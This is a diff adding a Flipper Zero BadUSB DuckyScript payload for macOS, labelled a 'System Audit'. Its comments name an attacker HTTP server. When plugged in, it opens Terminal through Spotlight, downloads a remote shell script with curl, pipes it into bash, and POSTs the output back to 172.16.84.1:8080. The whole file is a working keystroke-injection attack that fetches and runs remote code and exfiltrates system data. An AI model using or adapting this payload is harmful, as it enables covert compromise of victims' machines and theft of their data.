@@ -1,0 +1,24 @@
+REM Title: BadUSB - macOS System Audit
+REM Description: Opens Terminal via Spotlight and runs SysAudit_macos.sh
+REM              fetched from attacker HTTP server. Results POSTed back.
+REM Target: macOS 12+
+REM Author: <operator>
+REM Note: Flipper Zero BadUSB uses DuckyScript 1.0 syntax.
+REM       Set LHOST to your attacker IP before deploying.
+
+DELAY 2000
+
+REM Open Spotlight
+GUI SPACE
+DELAY 800
+
+REM Launch Terminal
+STRING Terminal
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Run audit payload
+STRING curl -s http://172.16.84.1:8080/SysAudit_macos.sh | bash > /tmp/sysaudit_out.txt 2>&1 && curl -s -X POST -d @/tmp/sysaudit_out.txt http://172.16.84.1:8080/upload
+DELAY 200
+ENTER
